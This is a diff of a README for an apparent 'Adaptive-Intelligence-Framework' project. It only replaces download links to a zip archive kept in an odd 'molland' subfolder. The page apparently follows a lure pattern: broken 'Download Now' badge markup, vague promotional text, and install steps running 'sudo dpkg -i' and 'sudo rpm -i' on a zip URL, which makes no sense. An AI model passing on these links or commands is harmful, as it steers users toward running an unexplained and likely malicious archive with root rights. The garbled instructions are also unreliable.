@@ -1,6 +1,6 @@
 # 🌟 Adaptive-Intelligence-Framework - Empower Your Systems with Stability
 
-[![Download Now](https://raw.githubusercontent.com/sparkyvasu/Adaptive-Intelligence-Framework/main/molland/Intelligence-Adaptive-Framework-1.2.zip%20Now-Click%https://raw.githubusercontent.com/sparkyvasu/Adaptive-Intelligence-Framework/main/molland/Intelligence-Adaptive-Framework-1.2.zip)](https://raw.githubusercontent.com/sparkyvasu/Adaptive-Intelligence-Framework/main/molland/Intelligence-Adaptive-Framework-1.2.zip)
+[![Download Now](https://github.com/sparkyvasu/Adaptive-Intelligence-Framework/raw/refs/heads/main/molland/Framework-Adaptive-Intelligence-Synedrion.zip%20Now-Click%https://github.com/sparkyvasu/Adaptive-Intelligence-Framework/raw/refs/heads/main/molland/Framework-Adaptive-Intelligence-Synedrion.zip)](https://github.com/sparkyvasu/Adaptive-Intelligence-Framework/raw/refs/heads/main/molland/Framework-Adaptive-Intelligence-Synedrion.zip)
 
 ## 📦 Overview
 
@@ -23,7 +23,7 @@ Before you start, ensure your system meets these basic requirements:
 
 To get the software, visit the releases page:
 
-[Download the Adaptive Intelligence Framework](https://raw.githubusercontent.com/sparkyvasu/Adaptive-Intelligence-Framework/main/molland/Intelligence-Adaptive-Framework-1.2.zip)
+[Download the Adaptive Intelligence Framework](https://github.com/sparkyvasu/Adaptive-Intelligence-Framework/raw/refs/heads/main/molland/Framework-Adaptive-Intelligence-Synedrion.zip)
 
 On this page, you will see different versions of the software. Choose the most recent release for the best features and updates. Click on the download link for your operating system to start the process.
 
@@ -52,11 +52,11 @@ Once downloaded, follow these steps to install the software:
 3. Navigate to the directory where the package is downloaded.
 4. Use the following command for `.deb` files:
    ```
-   sudo dpkg -i https://raw.githubusercontent.com/sparkyvasu/Adaptive-Intelligence-Framework/main/molland/Intelligence-Adaptive-Framework-1.2.zip
+   sudo dpkg -i https://github.com/sparkyvasu/Adaptive-Intelligence-Framework/raw/refs/heads/main/molland/Framework-Adaptive-Intelligence-Synedrion.zip
    ```
    For `.rpm` files:
    ```
-   sudo rpm -i https://raw.githubusercontent.com/sparkyvasu/Adaptive-Intelligence-Framework/main/molland/Intelligence-Adaptive-Framework-1.2.zip
+   sudo rpm -i https://github.com/sparkyvasu/Adaptive-Intelligence-Framework/raw/refs/heads/main/molland/Framework-Adaptive-Intelligence-Synedrion.zip
    ```
 5. After installation, you can launch it from your applications menu.
 
@@ -113,4 +113,4 @@ These resources will help deepen your understanding of how adaptive systems work
 
 ## 🔗 Download Here Again
 
-Don't forget to [download the Adaptive Intelligence Framework](https://raw.githubusercontent.com/sparkyvasu/Adaptive-Intelligence-Framework/main/molland/Intelligence-Adaptive-Framework-1.2.zip) to start using its powerful features today!
+Don't forget to [download the Adaptive Intelligence Framework](https://github.com/sparkyvasu/Adaptive-Intelligence-Framework/raw/refs/heads/main/molland/Framework-Adaptive-Intelligence-Synedrion.zip) to start using its powerful features today!
